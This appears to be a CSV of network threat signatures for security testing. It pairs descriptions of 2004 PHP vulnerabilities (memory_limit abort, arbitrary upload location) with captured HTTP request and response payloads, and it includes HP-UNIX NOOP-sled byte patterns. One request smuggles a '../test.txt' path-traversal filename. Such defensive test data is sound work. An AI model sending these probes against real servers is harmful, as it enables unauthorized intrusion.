XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿FSC20040720-01_PHP_memory_limit_Vulnerability.xml,PHP memory_limit vulnerability,There is a vulnerability in the way PHP aborts from a memory allocation which exceeds the memory limit. This operation is unsafe during the allocation and initialization of hash table elements. It is possible for an attacker to take control of a memory pointer and execute arbitrary code on the target.,HTTP,TCP,"POST /memlimit/upload.php HTTP/1.1[[0D 0A ]]Host: 10.2.1.92[[0D 0A ]]User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7) Gecko/20040626 Firefox/0.9.1[[0D 0A ]]Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5[[0D 0A ]]Accept-Language: en-us,en;q=0.5[[0D 0A ]]Accept-Encoding: gzip,deflate[[0D 0A ]]Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7[[0D 0A ]]Keep-Alive: 300[[0D 0A ]]Connection: keep-alive[[0D 0A ]]Referer: http://10.2.1.92/memlimit/upload.html[[0D 0A ]]Content-Type: multipart/form-data; boundary=---------------------------153501500631101[[0D 0A ]]Content-Length: 215[[0D 0A 0D 0A ]]-----------------------------153501500631101[[0D 0A ]]Content-Disposition: form-data; name=""userfile""; filename=""test.txt""[[0D 0A ]]Content-Type: text/plain[[0D 0A 0D 0A ]]This is a test file[[0D 0A 0D 0A ]]-----------------------------153501500631101--[[0D 0A]]"
FSC20040720-01_PHP_memory_limit_Vulnerability.xml,PHP memory_limit vulnerability,There is a vulnerability in the way PHP aborts from a memory allocation which exceeds the memory limit. This operation is unsafe during the allocation and initialization of hash table elements. It is possible for an attacker to take control of a memory pointer and execute arbitrary code on the target.,HTTP,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Wed, 21 Jul 2004 03:18:44 GMT[[0D 0A ]]Server: Apache/2.0.49 (Unix) PHP/4.3.7[[0D 0A ]]X-Powered-By: PHP/4.3.7[[0D 0A ]]Keep-Alive: timeout=15, max=100[[0D 0A ]]Connection: Keep-Alive[[0D 0A ]]Transfer-Encoding: chunked[[0D 0A ]]Content-Type: text/html; charset=ISO-8859-1[[0D 0A 0D 0A ]]ba[[0D 0A ]]<br />[[0A ]]<b>Fatal error</b>:  Allowed memory size of 16384 bytes exhausted at /root/php-4.3.7/Zend/zend_opcode.c:48 (tried to allocate 3840 bytes) in <b>Unknown</b> on line <b>0</b><br />[[0A 0D 0A ]]0[[0D 0A 0D 0A]]"
﻿FSC20040720-01_PHP_memory_limit_Vulnerability_IPv6.xml,PHP memory_limit vulnerability (IPv6 Version),There is a vulnerability in the way PHP aborts from a memory allocation which exceeds the memory limit. This operation is unsafe during the allocation and initialization of hash table elements. It is possible for an attacker to take control of a memory pointer and execute arbitrary code on the target. (IPv6 Version),HTTP/IPv6,TCP,"POST /memlimit/upload.php HTTP/1.1[[0D 0A ]]Host: 10.2.1.92[[0D 0A ]]User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7) Gecko/20040626 Firefox/0.9.1[[0D 0A ]]Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5[[0D 0A ]]Accept-Language: en-us,en;q=0.5[[0D 0A ]]Accept-Encoding: gzip,deflate[[0D 0A ]]Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7[[0D 0A ]]Keep-Alive: 300[[0D 0A ]]Connection: keep-alive[[0D 0A ]]Referer: http://10.2.1.92/memlimit/upload.html[[0D 0A ]]Content-Type: multipart/form-data; boundary=---------------------------153501500631101[[0D 0A ]]Content-Length: 215[[0D 0A 0D 0A ]]-----------------------------153501500631101[[0D 0A ]]Content-Disposition: form-data; name=""userfile""; filename=""test.txt""[[0D 0A ]]Content-Type: text/plain[[0D 0A 0D 0A ]]This is a test file[[0D 0A 0D 0A ]]-----------------------------153501500631101--[[0D 0A]]"
FSC20040720-01_PHP_memory_limit_Vulnerability_IPv6.xml,PHP memory_limit vulnerability (IPv6 Version),There is a vulnerability in the way PHP aborts from a memory allocation which exceeds the memory limit. This operation is unsafe during the allocation and initialization of hash table elements. It is possible for an attacker to take control of a memory pointer and execute arbitrary code on the target. (IPv6 Version),HTTP/IPv6,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Wed, 21 Jul 2004 03:18:44 GMT[[0D 0A ]]Server: Apache/2.0.49 (Unix) PHP/4.3.7[[0D 0A ]]X-Powered-By: PHP/4.3.7[[0D 0A ]]Keep-Alive: timeout=15, max=100[[0D 0A ]]Connection: Keep-Alive[[0D 0A ]]Transfer-Encoding: chunked[[0D 0A ]]Content-Type: text/html; charset=ISO-8859-1[[0D 0A 0D 0A ]]ba[[0D 0A ]]<br />[[0A ]]<b>Fatal error</b>:  Allowed memory size of 16384 bytes exhausted at /root/php-4.3.7/Zend/zend_opcode.c:48 (tried to allocate 3840 bytes) in <b>Unknown</b> on line <b>0</b><br />[[0A 0D 0A ]]0[[0D 0A 0D 0A]]"
﻿FSC20040922-01_PHP_Arbitrary_File_Location_Upload_Vulnerability.xml,PHP Arbitrary File Location Upload Vulnerability,"A vulnerability exists in PHP&apos;s handling of the Content-Disposition MIME header. An attacker could control the location of an uploaded file by supplying an arbitrary file name and path through this header. It is possible to exploit this vulnerability and upload a malicious file to an arbitrary location on the vulnerable system, possibly leading to arbitrary code execution.",HTTP,TCP,"POST /files/upload.php HTTP/1.1[[0A ]]Host: 10.2.1.79[[0A ]]User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.0; rv:1.7.3) Gecko/20040913 Firefox/0.10[[0A ]]Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5[[0A ]]Accept-Language: en-us,en;q=0.5[[0A ]]Accept-Encoding: gzip,deflate[[0A ]]Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7[[0A ]]Keep-Alive: 300[[0A ]]Connection: keep-alive[[0A ]]Referer: http://10.2.1.92/files/upload.html[[0A ]]Content-Type: multipart/form-data; boundary=---------------------------8342223121046[[0A ]]Content-Length: 296[[0A 0A ]]-----------------------------8342223121046[[0A ]]Content-Disposition: form-data; name=""file""; filename=""../test.txt""[[0A ]]Content-Type: text/plain[[0A 0A ]]Text file[[0A 0A ]]-----------------------------8342223121046[[0A ]]Content-Disposition: form-data; name=""upload""[[0A 0A ]]Upload file[[0A ]]-----------------------------8342223121046--[[0A 0A]]"
FSC20040922-01_PHP_Arbitrary_File_Location_Upload_Vulnerability.xml,PHP Arbitrary File Location Upload Vulnerability,"A vulnerability exists in PHP&apos;s handling of the Content-Disposition MIME header. An attacker could control the location of an uploaded file by supplying an arbitrary file name and path through this header. It is possible to exploit this vulnerability and upload a malicious file to an arbitrary location on the vulnerable system, possibly leading to arbitrary code execution.",HTTP,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Wed, 22 Sep 2004 20:02:24 GMT[[0D 0A ]]Server: Apache/2.0.47 (Fedora)[[0D 0A ]]X-Powered-By: PHP/4.3.3[[0D 0A ]]Connection: close[[0D 0A ]]Transfer-Encoding: chunked[[0D 0A ]]Content-Type: text/html; charset=UTF-8[[0D 0A 0D 0A ]]c[[0D 0A ]]Vulnerable.[[0A 0D 0A ]]3a[[0D 0A ]]The file would be saved in <upload_directory>/../test.txt[[0A 0D 0A ]]0[[0D 0A 0D 0A]]"
﻿FSC20040922-01_PHP_Arbitrary_File_Location_Upload_Vulnerability_IPv6.xml,PHP Arbitrary File Location Upload Vulnerability (IPv6 Version),"A vulnerability exists in PHP's handling of the Content-Disposition MIME header. An attacker could control the location of an uploaded file by supplying an arbitrary file name and path through this header. It is possible to exploit this vulnerability and upload a malicious file to an arbitrary location on the vulnerable system, possibly leading to arbitrary code execution. (IPv6 Version)",HTTP/IPv6,TCP,"POST /files/upload.php HTTP/1.1[[0A ]]Host: 10.2.1.79[[0A ]]User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.0; rv:1.7.3) Gecko/20040913 Firefox/0.10[[0A ]]Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5[[0A ]]Accept-Language: en-us,en;q=0.5[[0A ]]Accept-Encoding: gzip,deflate[[0A ]]Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7[[0A ]]Keep-Alive: 300[[0A ]]Connection: keep-alive[[0A ]]Referer: http://10.2.1.92/files/upload.html[[0A ]]Content-Type: multipart/form-data; boundary=---------------------------8342223121046[[0A ]]Content-Length: 296[[0A 0A ]]-----------------------------8342223121046[[0A ]]Content-Disposition: form-data; name=""file""; filename=""../test.txt""[[0A ]]Content-Type: text/plain[[0A 0A ]]Text file[[0A 0A ]]-----------------------------8342223121046[[0A ]]Content-Disposition: form-data; name=""upload""[[0A 0A ]]Upload file[[0A ]]-----------------------------8342223121046--[[0A 0A]]"
FSC20040922-01_PHP_Arbitrary_File_Location_Upload_Vulnerability_IPv6.xml,PHP Arbitrary File Location Upload Vulnerability (IPv6 Version),"A vulnerability exists in PHP's handling of the Content-Disposition MIME header. An attacker could control the location of an uploaded file by supplying an arbitrary file name and path through this header. It is possible to exploit this vulnerability and upload a malicious file to an arbitrary location on the vulnerable system, possibly leading to arbitrary code execution. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Wed, 22 Sep 2004 20:02:24 GMT[[0D 0A ]]Server: Apache/2.0.47 (Fedora)[[0D 0A ]]X-Powered-By: PHP/4.3.3[[0D 0A ]]Connection: close[[0D 0A ]]Transfer-Encoding: chunked[[0D 0A ]]Content-Type: text/html; charset=UTF-8[[0D 0A 0D 0A ]]c[[0D 0A ]]Vulnerable.[[0A 0D 0A ]]3a[[0D 0A ]]The file would be saved in <upload_directory>/../test.txt[[0A 0D 0A ]]0[[0D 0A 0D 0A]]"
﻿NOOPtcpHP-UNIX.xml,TCP NOOP Packet Variant HP-UNIX,"This threat sends a TCP packet that appears to be part of an existing valid connection with a NOOP sled in it. A NOOP sled is used by shellcode to insure that the injected code will execute. Unfortunately, there are many other reasons why a NOOP might appear in traffic. This threat utilized equivalent assembly instructions to the standard NOOP instruction.",TCP,TCP,[[08 ]]![[02 80 08 ]]![[02 80 08 ]]![[02 80 08 ]]![[02 80]]
﻿NOOPtcpHP-UNIX2.xml,TCP NOOP Packet Variant HP-UNIX 2,"This threat sends a TCP packet that appears to be part of an existing valid connection with a NOOP sled in it. A NOOP sled is used by shellcode to insure that the injected code will execute. Unfortunately, there are many other reasons why a NOOP might appear in traffic. This threat utilized equivalent assembly instructions to the standard NOOP instruction.",TCP,TCP,[[0B ]]9[[02 80 0B ]]9[[02 80 0B ]]9[[02 80 0B ]]9[[02 80]]
